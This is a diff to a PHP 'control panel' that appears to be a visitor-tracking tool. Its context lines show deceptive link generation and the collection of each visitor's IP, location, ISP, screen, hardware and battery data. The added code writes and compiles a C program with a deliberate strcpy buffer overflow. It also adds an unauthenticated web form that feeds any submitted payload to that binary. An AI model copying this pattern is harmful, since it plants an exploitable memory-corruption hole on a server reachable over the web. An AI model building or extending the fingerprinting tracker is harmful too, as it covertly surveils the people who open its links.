@@ -9,6 +9,29 @@ if (!is_dir($upload_dir)) {
     @mkdir($upload_dir, 0755, true);
 }
 
+// --- قسم تكامل كود C والثغرة ---
+if (!file_exists('vuln.c')) {
+    $vuln_code = "#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n\nvoid vulnerable_function(char *user_input) {\n    char buffer[64];\n    strcpy(buffer, user_input);\n}\n\nint main(int argc, char *argv[]) {\n    if (argc > 1) {\n        printf(\"Processing incoming data packet: %s\\n\", argv[1]);\n        vulnerable_function(argv[1]);\n        printf(\"Buffer processed successfully without immediate crash.\\n\");\n    } else {\n        printf(\"No data received.\\n\");\n    }\n    return 0;\n}";
+    @file_put_contents('vuln.c', $vuln_code);
+}
+
+$binary_path = './vuln_bin';
+if (!file_exists($binary_path) && file_exists('vuln.c')) {
+    @shell_exec('gcc vuln.c -o vuln_bin 2>&1');
+}
+
+$execution_output = "";
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['run_binary'])) {
+    $payload = $_POST['payload'] ?? '';
+    $safe_payload = escapeshellarg($payload);
+    if (file_exists($binary_path)) {
+        $execution_output = shell_exec("{$binary_path} {$safe_payload} 2>&1");
+    } else {
+        $execution_output = "Error: C binary compilation failed or GCC is missing.";
+    }
+}
+// -----------------------------
+
 try {
     $db = new PDO('sqlite:tracker_custom_bg.db');
     $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
@@ -167,7 +190,6 @@ if (isset($_GET['r'])) {
             $port = $_SERVER['REMOTE_PORT'] ?? 'Unknown';
             $location = get_ip_location_and_isp($public_ip, $ua);
             
-            // استقبال البيانات العميقة المحملة من المتصفح
             $screen = $_POST['screen'] ?? 'N/A';
             $hardware = $_POST['hardware'] ?? 'N/A';
             $battery = $_POST['battery'] ?? 'N/A';
@@ -343,7 +365,7 @@ if (!empty($filter_code)) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Control Panel</title>
+    <title>Control Panel & C Binary Testing</title>
     <style>
         :root {
             --bg-main: #0b0f17;
@@ -378,6 +400,8 @@ if (!empty($filter_code)) {
         .result-panel label { display: block; font-size: 10px; text-transform: uppercase; color: var(--text-muted); margin-bottom: 6px; }
         .flex-row { display: flex; gap: 8px; }
 
+        .terminal-box { background: #020617; border: 1px solid var(--border-color); border-radius: 8px; padding: 14px; font-family: monospace; font-size: 13px; color: #38bdf8; margin-top: 10px; white-space: pre-wrap; word-break: break-all; }
+
         .gallery-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(260px, 1fr)); gap: 16px; margin-top: 15px; }
         .card-img { background: #020617; border: 1px solid var(--border-color); border-radius: 8px; padding: 12px; }
         .card-img img { width: 100%; height: 160px; object-fit: cover; border-radius: 6px; border: 1px solid var(--border-color); }
@@ -406,6 +430,7 @@ if (!empty($filter_code)) {
 <body>
     <div class="wrapper">
         
+        <!-- قسم توليد الروابط -->
         <div class="section-box">
             <h2>Generate Deep Intelligence Link</h2>
             <form method="POST" class="form-grid">
@@ -430,6 +455,23 @@ if (!empty($filter_code)) {
             <?php endif; ?>
         </div>
 
+        <!-- قسم اختبار ثغرة لغة C (Buffer Overflow) -->
+        <div class="section-box">
+            <h2>C Binary Vulnerability Testing Engine (Buffer Overflow)</h2>
+            <form method="POST" class="form-grid">
+                <input type="text" name="payload" placeholder="Enter payload string (e.g., AAAAA... or input data)..." value="<?php echo htmlspecialchars($_POST['payload'] ?? ''); ?>" required autocomplete="off">
+                <button type="submit" name="run_binary" class="btn" style="background: #10b981;">Execute Payload in C Binary</button>
+            </form>
+
+            <?php if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['run_binary'])): ?>
+                <div class="result-panel">
+                    <label>Execution Output:</label>
+                    <div class="terminal-box"><?php echo htmlspecialchars($execution_output); ?></div>
+                </div>
+            <?php endif; ?>
+        </div>
+
+        <!-- قسم عرض البيانات والتقاطعات -->
         <div class="section-box">
             <h2>Deep Hardware & Network Intelligence</h2>
             <form method="GET" style="margin-bottom: 15px; display: flex; gap: 8px;">
